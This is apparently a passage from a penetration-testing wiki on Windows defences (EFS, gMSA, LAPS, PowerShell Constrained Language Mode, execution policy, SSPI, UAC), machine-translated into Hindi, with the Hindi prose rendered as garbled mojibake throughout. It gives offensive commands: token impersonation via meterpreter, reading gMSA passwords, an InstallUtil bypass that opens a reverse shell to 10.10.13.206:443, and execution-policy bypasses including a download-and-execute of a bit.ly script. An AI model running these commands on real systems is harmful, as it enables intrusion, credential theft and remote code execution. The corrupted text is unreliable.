рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдиреЗ **рдЗрд╕ рд╕реЗрд╡рд╛** рдХрд╛ **рдЙрдкрдпреЛрдЧ** рдХрд┐рдпрд╛ рд╣реИ рдЗрд╕ рдкрде рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреЗрдЦреЗрдВ рдХрд┐ **рдХреМрди** рдлрд╝рд╛рдЗрд▓ рдХрд╛ **рдЙрдкрдпреЛрдЧ** рдХрд░ рд░рд╣рд╛ рд╣реИ cipher /c \<file>\
рдЖрдк `cipher /e` рдФрд░ `cipher /d` рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рднреАрддрд░ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдФрд░ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

### EFS рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛

#### рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкреНрд░рдгрд╛рд▓реА рд╣реЛрдирд╛

рдЗрд╕ рддрд░реАрдХреЗ рдореЗрдВ **рд╢рд┐рдХрд╛рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ **рд╣реЛрд╕реНрдЯ** рдХреЗ рдЕрдВрджрд░ рдПрдХ **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ `meterpreter` рд╕рддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЯреЛрдХрди рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (`incognito` рд╕реЗ `impersonate_token`)ред рдпрд╛ рдЖрдк рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ `migrate` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирдирд╛

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## рд╕рдореВрд╣ рдкреНрд░рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ (gMSA)

рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдиреЗ **рд╕рдореВрд╣ рдкреНрд░рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ (gMSA)** рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдП рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдИрдЯреА рдмреБрдирд┐рдпрд╛рджреЛрдВ рдореЗрдВ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рд╕рд░рд▓ рд╣реЛред рдЕрдХреНрд╕рд░ рдЬреЛ рд░рд╛рд╕реНрддреНрд░реАрдп рдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдиреАрддрд┐ рдХреЗ рдЕрдиреБрд╕рд╛рд░ "**рдкрд╛рд╕рд╡рд░реНрдб рдХрднреА рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛**" рд╕реЗрдЯрд┐рдВрдЧ рд╕рдХреНрд╖рдо рд╣реЛрддреА рд╣реИ, gMSAs рдПрдХ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрдиреАрдп рд╕рдорд╛рдзрд╛рди рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ:

* **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдмрдВрдзрди**: gMSAs рдПрдХ рдЬрдЯрд┐рд▓, 240-рд╡рд░реНрдгреАрдп рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдбреЛрдореЗрди рдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдиреАрддрд┐ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмрджрд▓рддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдХреА рдХреА рд╡рд┐рддрд░рдг рд╕реЗрд╡рд╛ (KDC) рджреНрд╡рд╛рд░рд╛ рд╕рдВрднрд╛рд▓реА рдЬрд╛рддреА рд╣реИ, рдореИрдиреНрдпреБрдЕрд▓ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдкрдбреЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдЦрддреНрдо рдХрд░рддреЗ рд╣реБрдПред
* **рд╡реГрджреНрдзрд┐ рд╕реБрд░рдХреНрд╖рд╛**: рдпреЗ рдЦрд╛рддреЗ рд▓реЙрдХрдЖрдЙрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рд░реЛрдзреА рд╣реИрдВ рдФрд░ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд▓реЙрдЧрдЗрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛, рдЬрд┐рдирдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рддреЗ рд╣реИрдВред
* **рдПрдХрд╛рдзрд┐рдХ рд╣реЛрд╕реНрдЯ рд╕рдорд░реНрдерди**: gMSAs рдХрдИ рд╣реЛрд╕реНрдЯреЛрдВ рдкрд░ рд╕рд╛рдЭрд╛ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдПрдХрд╛рдзрд┐рдХ рд╕рд░реНрд╡рд░ рдкрд░ рдЪрд▓ рд░рд╣реА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЖрджрд░реНрд╢ рдмрдирд╛рддрд╛ рд╣реИред
* **рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдп рдХреНрд╖рдорддрд╛**: рдкреНрд░рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреА рддрд░рд╣, gMSAs рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд╛рд░реНрдп рдХреНрд╖рдорддрд╛ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред
* **рд╕рд░рд▓реАрдХреГрдд SPN рдкреНрд░рдмрдВрдзрди**: рдЬрдм рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ sAMaccount рд╡рд┐рд╡рд░рдг рдпрд╛ DNS рдирд╛рдо рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реЗрд╡рд╛ рдореБрдЦреНрдп рдирд╛рдо (SPN) рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ SPN рдкреНрд░рдмрдВрдзрди рд╕рд░рд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

gMSAs рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб _**msDS-ManagedPassword**_ рдирд╛рдордХ LDAP рдЧреБрдг рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ (DCs) рджреНрд╡рд╛рд░рд╛ рд╣рд░ 30 рджрд┐рди рдореЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд░реАрд╕реЗрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдпрд╣ рдкрд╛рд╕рд╡рд░реНрдб, рдЬрд┐рд╕реЗ [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХреЗрд╡рд▓ рдЕрдзрд┐рдХреГрдд рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдФрд░ рдЙрди рд╕рд░реНрд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рди рдкрд░ gMSAs рд╕реНрдерд╛рдкрд┐рдд рд╣реИрдВ, рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рд╡рд╛рддрд╛рд╡рд░рдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдПред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, LDAPS рдЬреИрд╕реА рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрдиреЗрдХреНрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдпрд╛ рдХрдиреЗрдХреНрд╢рди рдХреЛ 'рд╕реАрд▓рд┐рдВрдЧ рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд' рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

рдЖрдк рдЗрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) рдХреЗ рд╕рд╛рде рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ:
```
/GMSAPasswordReader --AccountName jkohler
```
[**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛рдПрдВ**](https://cube0x0.github.io/Relaying-for-gMSA/)

рдЗрд╕ [рд╡реЗрдм рдкреЗрдЬ](https://cube0x0.github.io/Relaying-for-gMSA/) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ **NTLM рд░рд┐рд▓реЗ рдЕрдЯреИрдХ** рдХреЛ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдП рддрд╛рдХрд┐ **gMSA** рдХрд╛ **рдкрд╛рд╕рд╡рд░реНрдб рдкрдврд╝рд╛** рдЬрд╛ рд╕рдХреЗред

## LAPS

**рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╢рд╛рд╕рдХ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдорд╛рдзрд╛рди (LAPS)**, рдЬреЛ [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реИ, рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╢рд╛рд╕рдХ рдкрд╛рд╕рд╡рд░реНрдбреЛрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИред рдпреЗ рдкрд╛рд╕рд╡рд░реНрдб **рд░реИрдВрдбрдорд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП**, рдЕрджреНрд╡рд┐рддреАрдп рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ **рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдмрджрд▓рддреЗ** рд░рд╣рддреЗ рд╣реИрдВ, рдЬреЛ рдХреЗрдВрджреНрд░реАрдп рд░реВрдк рд╕реЗ рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред рдЗрди рдкрд╛рд╕рд╡рд░реНрдбреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдЕрдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП ACLs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде, рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╢рд╛рд╕рдХ рдкрд╛рд╕рд╡рд░реНрдб рдкрдврд╝рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **рдХрдИ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рдмрдВрдж рдХрд░ рджреЗрддрд╛ рд╣реИ** рдЬреЛ PowerShell рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ COM рдСрдмреНрдЬ
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### рдмрд╛рдпрдкрд╛рд╕
```powershell
#Easy bypass
Powershell -version 2
```
In current Windows рдЙрд╕ рдмрд╛рдЗрдкрд╛рд╕ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди рдЖрдк **PSByPassCLM** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд╢рд╛рдпрдж рдЗрд╕реЗ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА** **рдПрдХ рд╕рдВрджрд░реНрдн рдЬреЛрдбрд╝реЗрдВ** -> _рдмреНрд░рд╛рдЙрдЬрд╝_ ->_рдмреНрд░рд╛рдЙрдЬрд╝_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` рдЬреЛрдбрд╝реЗрдВ рдФрд░ **рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ .Net4.5 рдореЗрдВ рдмрджрд▓реЗрдВ**.

#### рд╕реАрдзрд╛ рдмрд╛рдЗрдкрд╛рд╕:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
рдЖрдк [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдпрд╛ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **Powershell рдХреЛ рдирд┐рд╖рд┐рджреНрдз рдореЛрдб** рдХреЛ рдЫрд▓рдХрд░ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдПред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Execution Policy

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ **restricted** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рдиреАрддрд┐ рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреЗ рдореБрдЦреНрдп рддрд░реАрдХреЗ:
```powershell
1┬║ Just copy and paste inside the interactive PS console
2┬║ Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3┬║ Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4┬║ Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5┬║ Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6┬║ Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7┬║ Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8┬║ Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9┬║ Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
## рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд░реНрдерди рдкреНрд░рджрд╛рддрд╛ рдЗрдВрдЯрд░рдлреЗрд╕ (SSPI)

рдпрд╣ рдПрдкреАрдЖрдИ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

SSPI рдХреЛ рджреЛ рдорд╢реАрдиреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рддреА рд╣реИ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЦреЛрдЬрдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП рдкрд╕рдВрджреАрджрд╛ рд╡рд┐рдзрд┐ Kerberos рд╣реИред рдлрд┐рд░ SSPI рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреМрди рд╕рд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд░реНрдерди рдкреНрд░рджрд╛рддрд╛ (SSP) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпреЗ рд╣рд░ рд╡рд┐рдВрдбреЛрдЬ рдорд╢реАрди рдореЗрдВ рдПрдХ DLL рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рджреЛрдиреЛрдВ рдорд╢реАрдиреЛрдВ рдХреЛ рд╕рдВрдЪрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реА рд╕рдорд░реНрдерди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

### рдореБрдЦреНрдп SSPs

* **Kerberos**: рдкрд╕рдВрджреАрджрд╛
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** рдФрд░ **NTLMv2**: рд╕рдВрдЧрддрд┐ рдХрд╛рд░рдг
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: рд╡реЗрдм рд╕рд░реНрд╡рд░ рдФрд░ LDAP, рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ MD5 рд╣реИрд╢ рдХреЗ рд░реВрдк рдореЗрдВ
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL рдФрд░ TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреА рдЪрд░реНрдЪрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (Kerberos рдпрд╛ NTLM рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, Kerberos рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╣реИ)
* %windir%\Windows\System32\lsasrv.dll

#### рдЪрд░реНрдЪрд╛ рдХрдИ рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рд╕реНрддреБрдд рдХрд░ рд╕рдХрддреА рд╣реИ рдпрд╛ рдХреЗрд╡рд▓ рдПрдХред

## UAC - рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг

[рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ **рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдкреНрд░реЙрдореНрдкреНрдЯ** рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИред
